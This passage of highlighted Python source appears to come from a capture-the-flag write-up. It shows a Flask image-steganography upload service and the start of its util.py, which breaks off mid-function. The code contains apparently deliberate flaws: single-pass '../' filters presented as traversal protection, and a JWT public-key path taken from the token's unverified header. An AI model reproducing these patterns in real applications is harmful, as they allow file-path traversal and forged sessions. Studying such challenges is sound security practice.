&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">make_response&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">send_file&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">imghdr&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">imghdr&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">tests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">hashlib&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">util&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;span style="color:#75715e"># https://stackoverflow.com/questions/36870661/imghdr-python-cant-detec-type-of-some-images-image-extension&lt;/span>
&lt;span style="color:#75715e"># there are no bugs here. just patching imghdr&lt;/span>
&lt;span style="color:#111">JPEG_MARK&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\xff\xd8\xff\xdb\x00&lt;/span>&lt;span style="color:#d88200">C&lt;/span>&lt;span style="color:#8045ff">\x00\x08\x06\x06&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> \
&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x07\x06\x05\x08\x07\x07\x07\t\t\x08\n\x0c\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">test_jpeg1&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">h&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;JPEG data in JFIF format&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;JFIF&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">h&lt;/span>&lt;span style="color:#111">[:&lt;/span>&lt;span style="color:#ae81ff">23&lt;/span>&lt;span style="color:#111">]:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;jpeg&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">test_jpeg2&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">h&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;JPEG with small header&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">h&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#ae81ff">67&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">h&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">h&lt;/span>&lt;span style="color:#111">[:&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">JPEG_MARK&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;jpeg&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">test_jpeg3&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">h&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;JPEG data in JFIF or Exif format&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">h&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">6&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;JFIF&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;Exif&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">or&lt;/span> &lt;span style="color:#111">h&lt;/span>&lt;span style="color:#111">[:&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\xff\xd8&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;jpeg&amp;#39;&lt;/span>
&lt;span style="color:#111">tests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">test_jpeg1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">tests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">test_jpeg2&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">tests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">test_jpeg3&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">verify_jpeg&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">file_path&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">jpeg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Image&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">file_path&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">jpeg&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">verify&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">imghdr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">what&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">file_path&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#39;jpeg&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">False&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">False&lt;/span>
&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">config&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;MAX_CONTENT_LENGTH&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">1024&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">1024&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">make_response&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;upload.html&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cookies&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;session&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">set_cookie&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;session&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">create_token&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">resp&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/upload&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">upload&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cookies&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;session&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">session&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">cookies&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;session&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">uploaded_file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">files&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;file&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;password&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">content&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;content&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">upload_name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">uploaded_file&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;../&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># no traversal!&lt;/span>
&lt;span style="color:#111">output_name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;output/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">basename&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">upload_name&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">image_data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">uploaded_file&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">stream&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">image_md5&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">hashlib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">md5&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">image_data&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">hexdigest&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">image_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;uploads/&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">image_md5&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">.jpeg&amp;#39;&lt;/span>
&lt;span style="color:#111">content_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;uploads/&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">rand_string&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">.txt&amp;#34;&lt;/span>
&lt;span style="color:#75715e"># write temp txt file&lt;/span>
&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">content_path&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;w&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">content&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75715e"># write temp image file&lt;/span>
&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">image_path&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;wb&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">image_data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75715e"># verify jpeg validity&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">verify_jpeg&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">image_path&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;File is not a valid JPEG!&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span>
&lt;span style="color:#75715e"># verify session before using it&lt;/span>
&lt;span style="color:#111">session&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">verify_token&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;Session token invalid!&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span>
&lt;span style="color:#75715e"># attempt to embed message in image&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">embed_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">content_path&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">image_path&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">output_name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;Embedding failed!&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span>
&lt;span style="color:#75715e"># append username to output path to prevent vulns&lt;/span>
&lt;span style="color:#111">sanitized_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;output/&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">upload_name&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">_&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">exists&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sanitized_path&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">rename&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">output_name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">sanitized_path&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">pass&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">send_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sanitized_path&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;Something went wrong! Check your file name&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">1337&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># util.py&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">PIL&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Image&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">jwt&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">string&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">imghdr&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">tests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">subprocess&lt;/span>
&lt;span style="color:#111">priv_key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;keys/private.pem&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">create_token&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">priv_key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;keys/private.pem&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">token&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">jwt&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">encode&lt;/span>&lt;span style="color:#111">({&lt;/span>&lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;guest_&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">10000&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">},&lt;/span> &lt;span style="color:#111">priv_key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">algorithm&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;RS256&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;pubkey&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;public.pem&amp;#39;&lt;/span>&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">token&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">verify_token&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">token&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">headers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">jwt&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get_unverified_header&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">token&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">pub_key_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;pubkey&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">pub_key_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pub_key_path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;..&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e"># no traversal!&lt;/span>
